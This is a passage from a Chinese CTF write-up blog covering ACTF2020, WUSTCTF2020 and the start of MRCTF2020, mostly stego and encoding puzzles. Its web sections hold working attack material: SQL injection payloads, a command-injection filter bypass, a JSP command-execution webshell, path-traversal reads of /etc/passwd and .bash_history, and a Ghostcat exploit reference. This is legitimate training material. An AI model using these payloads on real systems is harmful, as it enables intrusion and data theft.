<h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>导出http对象、伪加密、strings一下（或者vim -r</p>
<p>wireshark导出http对象，然后010改一下伪加密，得到.flag.swp，strings输出得到flag，或者vim -r恢复一下swp文件得到flag：<code>actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/13/ACTF2020/6.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>文件分离、明文攻击</p>
<p>把woo.jpg里面的压缩包分离出来，然后根据这两个压缩包进行明文攻击</p>
<p>得到flag：<code>ACTF{3te9_nbb_ahh8}</code></p>
<h3 id="剑龙"><a href="#剑龙" class="headerlink" title="剑龙"></a>剑龙</h3><p>aaencode、属性、steghide、des、stegosaurus隐写</p>
<p>将<code>pwd.txt</code>里面的颜文字解码得到：<code>welcom3!</code>，然后将其作为密钥，解出<code>hh.jpg</code>的steghide的隐写</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide.exe extract -sf hh.jpg</span><br><span class="line">Enter passphrase:welcom3!</span><br><span class="line">wrote extracted data to &quot;secret.txt&quot;.</span><br><span class="line"></span><br><span class="line">secret.txt:</span><br><span class="line">想要flag吗？解出我的密文吧~</span><br><span class="line">U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></div>

<p>在<code>hh.jpg</code>属性里找到密钥：<code>@#$%^&amp;%%$)</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>提示stegosaurus隐写，其实直接file O_O就可以得到<code>O_O: python 3.6 byte-compiled</code>也能猜到pyc</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;stegosaurus -x O_O.pyc</span><br><span class="line">Extracted payload: flag&#123;3teg0Sauru3_!1&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="frequency"><a href="#frequency" class="headerlink" title="frequency"></a>frequency</h3><p>隐藏文字和属性连起来base64、字频统计</p>
<p>u1s1，这题咋猜到连起来的。。将两段base64连起来字频统计后得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;a&#39;, &#39;c&#39;, &#39;t&#39;, &#39;f&#39;, &#39;p&#39;, &#39;l&#39;, &#39;o&#39;, &#39;k&#39;, &#39;m&#39;, &#39;i&#39;, &#39;j&#39;, &#39;n&#39;, &#39;u&#39;, &#39;h&#39;, &#39;b&#39;, &#39;y&#39;, &#39;g&#39;, &#39;v&#39;, &#39;r&#39;, &#39;d&#39;, &#39;x&#39;, &#39;e&#39;, &#39;s&#39;, &#39;z&#39;, &#39;w&#39;, &#39;q&#39;, &#39;&#125;&#39;, &#39;&#123;&#39;, &#39;_&#39;, &#39;^&#39;, &#39;]&#39;, &#39;[&#39;, &#39;Z&#39;, &#39;Y&#39;, &#39;X&#39;, &#39;W&#39;, &#39;V&#39;, &#39;U&#39;, &#39;T&#39;, &#39;S&#39;, &#39;R&#39;, &#39;Q&#39;, &#39;P&#39;, &#39;O&#39;, &#39;N&#39;, &#39;M&#39;, &#39;L&#39;, &#39;K&#39;, &#39;J&#39;, &#39;I&#39;, &#39;H&#39;, &#39;G&#39;, &#39;F&#39;, &#39;E&#39;, &#39;D&#39;, &#39;C&#39;, &#39;B&#39;, &#39;A&#39;, &#39;@&#39;, &#39;&#x3D;&#39;, &#39;9&#39;, &#39;8&#39;, &#39;7&#39;, &#39;6&#39;, &#39;5&#39;, &#39;4&#39;, &#39;3&#39;, &#39;2&#39;, &#39;1&#39;, &#39;0&#39;, &#39;-&#39;, &#39;+&#39;, &#39;*&#39;, &#39;)&#39;, &#39;(&#39;, &#39;&amp;&#39;, &#39;%&#39;, &#39;$&#39;, &#39;#&#39;, &#39;!&#39;, &#39; &#39;]</span><br></pre></td></tr></table></figure></div>

<p>放一下脚本：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alphabet = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]"</span></span><br><span class="line">f = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span><span class="params">(d)</span>:</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(backitems))]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">print(sort_by_value(result))</span><br></pre></td></tr></table></figure></div>

<h3 id="music"><a href="#music" class="headerlink" title="music"></a>music</h3><p>文件异或</p>
<p>有大量A1出现，本应该是00的所以整个文件于A1进行异或得到原本mp4文件</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>收听音频得到flag</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020</title>
    <url>/2020/04/02/WUSTCTF2020/</url>
    <content><![CDATA[<!--看不下去资料呀，web基础知识也学不下去呀，唉，先面向题目学习吧-->

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="朴实无华"><a href="#朴实无华" class="headerlink" title="朴实无华"></a>朴实无华</h3><p>robots协议、HTTP头、简单bypass</p>
<p>看网页标题，暗示查看<code>robots.txt</code>，在里面发现<code>fAke_f1agggg.php</code></p>
<p>访问后F12，查看到http头中有一项<code>Look_at_me: /fl4g.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;"</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"金钱解决不了穷人的本质问题"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//level 2 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123; </span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>]; </span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5)) </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;"</span>; </span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123; </span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123; </span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;"</span>; </span><br><span class="line">        system($get_flag); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"快到非洲了"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"去非洲吧"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>intval()函数可以用十六进制等于0，intval($num + 1)会强制转化来绕过</p>
<p>$md5==md5($md5)这个需要爆破出来一个0e开头的md5加密后还是0e开头的字符串（百度也行</p>
<p>官方wp那里嫖来的脚本（<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-24-solves" target="_blank" rel="noopener">52HeRtz</a>）</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> dict_az</span><br><span class="line">	dict_az = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		result = <span class="string">'0e'</span></span><br><span class="line">		result += str(i)</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line">		hashed_s = hashlib.md5(result.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">		r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line">		<span class="keyword">if</span> r:</span><br><span class="line">			print(<span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(result, hashed_s))</span><br><span class="line">			exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> i % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">			print(<span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(result, str(i)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] found! md5( 0e215962017 ) ---&gt; 0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure></div>

<p>绕过后，<code>get_flag=ls</code>看一下都有啥文件，发现flag文件<code>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<p>过滤了空格、cat、wctf2020，可以构造<code>get_flag=ca\t${IFS}flll*</code>，得到flag</p>
<h3 id="颜值成绩查询"><a href="#颜值成绩查询" class="headerlink" title="颜值成绩查询"></a>颜值成绩查询</h3><p>整数型注入，过滤了空格和union，sqlmap的UA</p>
<p>用/**/代替空格，双写union绕过:ununionion</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">猜列</span><br><span class="line">1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata</span><br><span class="line">查表</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;ctf&#39;</span><br><span class="line">查列</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(value)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.flag</span><br></pre></td></tr></table></figure></div>

<h3 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h3><p>注册、登录后，文件上传绕过exif_imagetype()就好，加个文件头GIF89a</p>
<p>对后缀没有限制上传php就好,蚁剑连上在根目录就会发现flag（原题好像是权限不够，需要运行readflag</p>
<h3 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h3><p>考点：JSP、CVE-2020-1938幽灵猫文件包含</p>
<p>参考的博客：<a href="https://imagin.vip/?p=1126#easyweb" target="_blank" rel="noopener">IMAGIN’S BLOG</a>、<a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">颖奇L’Amore</a>、<a href="http://github.mrkaixin.computer/2020/04/03/WUST-CTF2020/" target="_blank" rel="noopener">Mr.Kaixin</a>、<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">52HeRtz’s Blog</a></p>
<p>这题卡了好久，还是第一次做这种根据CVE改的CTF题目，最初看官方wp纠结于pocsuite的使用，配置了好久，用不来。。然后就去看了下别的大佬的博客，自己又摸索了半天才搞出来。。</p>
<p>这里有两种解法。</p>
<p>预期解就是上传一个jsp命令执行🐎，然后用幽灵🐱漏洞去包含这个🐎，执行后通过回显得知flag的位置。</p>
<p>非预期就是通过任意文件下载来读/home/tomajp/.bashrc_history，从而得到执行生成flag时的存放位置，进而去读flag所在文件得到flag，但是在buu上由于是docker生成的所以不需要去通过tomajp用户去生产flag所以就无非预期了。(其实还有，如果你能猜到根目录下存放flag的文件的名字，不过基本不可能。。因为它叫<code>flag78bt787it8b9b098j0k80k0ggg</code></p>
<p>非预期解还挺简单的:</p>
<p>1.任意上传一个文件，然后用错误的文件名去读一下，文件路径就会暴露出来</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>2.<code>download?file=../../../../../../../etc/passwd</code>读到存在tomajp用户，然后下载它的bash_history文件 <code>download?file=../../../../../../../home/tomajp/.bash_history</code>发现执行过的命令，发现flag存放的文件夹，然后读取flag存放文件夹<code>download?file=../../../../../../../flaaaag/what_you_want</code>得到flag</p>
<p>预期解：</p>
<p>1.上传一个jsp🐎</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">jsp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">"执行的命令"</span>).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">	out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">执行的命令:</span></span><br><span class="line"><span class="comment">ls -al \ 被这个\坑傻了自动把后面的"转译了报错字符串闭合问题，不懂java的我还以为是字符串里的空格问题，后来偶然看到转译\\r的时候才反应过来所以我把命令换成了ls -al /</span></span><br><span class="line"><span class="comment">cat /flag78bt787it8b9b098j0k80k0ggg</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<p>2.通过AJP包含这个jsp文件，从而执行其中的代码（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487" target="_blank" rel="noopener">脚本地址</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>发现根目录下flag存放位置，读取得到flag</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>详细步骤：先把这个ajpShooter.py上传到buu的linux-lab的机子上，然后用这个脚本包含你上传的文件，最后通过各样式的命令执行得到flag。反弹shell那个jsp脚本我用不来。。（注意：<code>Lan Domain: 2554-169ec896-03d5-483f-97ca-369fbcc3bdbf</code>用的是局域网，用read可以去读取文件的内容，eval是输出文件执行的结果。</p>
<p>最后有时间去复现一下这个漏洞<a href="https://www.liuyixiang.com/post/109123.html" target="_blank" rel="noopener">CVE-2020-1938</a></p>
<h3 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h3><p>这个等学学目录跨越和jsp相关知识再来复现吧。</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h3><p>考点：电话音、九键键盘</p>
<p>这次有点多就不对着表手解了，用个自动化工具<a href="https://github.com/hfeeki/dtmf" target="_blank" rel="noopener">dtmf-decoder</a>搞一下得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">999*666*88*2*777*33*6*999*4*444*777*555*333*777*444*33*66*3*7777</span><br></pre></td></tr></table></figure></div>

<p>对着九键键盘翻译一下得到flag：<code>flag{youaremygirlfriends}</code></p>
<h3 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a>find_me</h3><p>看备注+<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen" target="_blank" rel="noopener">盲文转换</a></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/02/WUSTCTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="爬"><a href="#爬" class="headerlink" title="爬"></a>爬</h3><p>判断文件类型为pdf，用wps等工具打开，图片后面有另一个图片，得到字符串</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707d</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.qqxiuzi.cn/bianma/base.php?type=16" target="_blank" rel="noopener">base16解码</a>，得到flag：<code>wctf2020{th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p}</code></p>
<h3 id="spaceclub"><a href="#spaceclub" class="headerlink" title="spaceclub"></a>spaceclub</h3><p>长空格为1，空格为0得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</span><br></pre></td></tr></table></figure></div>

<p>2进制转ASCII，得到flag：<code>wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}</code></p>
<h3 id="alison-likes-jojo"><a href="#alison-likes-jojo" class="headerlink" title="alison_likes_jojo"></a>alison_likes_jojo</h3><p>文件分离、zip爆破、多次base64、outguess</p>
<p>boki.jpg分离出一个zip，爆破出来密码是<code>888866</code>，得到一个文本多次base64解密后得到key：<code>killerqueen</code></p>
<p>stegdetect测不出来。。看wp，没说啥软件测出来的。。就嗯猜？？</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">outguess -r jljy.jpg -k <span class="string">"killerqueen"</span> 1.txt</span><br></pre></td></tr></table></figure></div>

<p>得到flag：<code>wctf2020{pretty_girl_alison_likes_jojo}</code></p>
<h3 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h3><p>这个密码学题更像misc，就写到这里吧</p>
<p>新佛曰、社会主义核心价值观、栏栅、凯撒、base32</p>
<p>前三个还好，凯撒那个位数是真的有、恶心（官方解释：凯撒密码最广的是移位3位，很多在线解码器默认也是3位，所以这里也是3位移位。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">尊即寂修我劫修如婆愍闍嚤婆莊愍耨羅嚴是喼婆斯吶眾喼修迦慧迦嚩喼斯願嚤摩隸所迦摩吽即塞願修咒莊波斯訶喃壽祗僧若即亦嘇蜜迦須色喼羅囉咒諦若陀喃慧愍夷羅波若劫蜜斯哆咒塞隸蜜波哆咤慧聞亦吽念彌諸嘚嚴諦咒陀叻咤叻諦缽隸祗婆諦嚩阿兜宣囉吽色缽吶諸劫婆咤咤喼愍尊寂色缽嘚闍兜阿婆若叻般壽聞彌即念若降宣空陀壽愍嚤亦喼寂僧迦色莊壽吽哆尊僧喼喃壽嘚兜我空所吶般所即諸吽薩咤諸莊囉隸般咤色空咤亦喃亦色兜哆嘇亦隸空闍修眾哆咒婆菩迦壽薩塞宣嚩缽寂夷摩所修囉菩阿伏嘚宣嚩薩塞菩波吶波菩哆若慧愍蜜訶壽色咒兜摩缽摩諦劫諸陀即壽所波咤聞如訶摩壽宣咤彌即嚩蜜叻劫嘇缽所摩闍壽波壽劫修訶如嚩嘇囉薩色嚤薩壽修闍夷闍是壽僧劫祗蜜嚴嚩我若空伏諦念降若心吽咤隸嘚耨缽伏吽色寂喃喼吽壽夷若心眾祗喃慧嚴即聞空僧須夷嚴叻心願哆波隸塞吶心須嘇摩咤壽嘚吶夷亦心亦喃若咒壽亦壽囑囑</span><br><span class="line">平等文明自由友善公正自由诚信富强自由自由平等民主平等自由自由友善敬业平等公正平等富强平等自由平等民主和谐公正自由诚信平等和谐公正公正自由法治平等法治法治法治和谐和谐平等自由和谐自由自由和谐公正自由敬业自由文明和谐平等自由文明和谐平等和谐文明自由和谐自由和谐和谐平等和谐法治公正诚信平等公正诚信民主自由和谐公正民主平等平等平等平等自由和谐和谐和谐平等和谐自由诚信平等和谐自由自由友善敬业平等和谐自由友善敬业平等法治自由法治和谐和谐自由友善公正法治敬业公正友善爱国公正民主法治文明自由民主平等公正自由法治平等文明平等友善自由平等和谐自由友善自由平等文明自由民主自由平等平等敬业自由平等平等诚信富强平等友善敬业公正诚信平等公正友善敬业公正平等平等诚信平等公正自由公正诚信平等法治敬业公正诚信平等法治平等公正友善平等公正诚信自由公正友善敬业法治法治公正公正公正平等公正诚信自由公正和谐公正平等</span><br><span class="line">RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</span><br><span class="line">R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar_</span><br><span class="line">o5rxizrsgazda63onfpwqylpl54gsylom5pxq2lbnztv6zdbl53w67i</span><br></pre></td></tr></table></figure></div>

<p>最后再来个base32，得到flag：<code>wctf2020{ni_hao_xiang_xiang_da_wo}</code></p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/03/30/MRCTF/</url>
    <content><![CDATA[<p>周末有两场比赛，WUST和MRCTF，都去看了一下（虽然没咋做题），密码学烦人啊（真滴难），还是在buu复盘有意思</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h3><p>代码审计、弱类型</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span 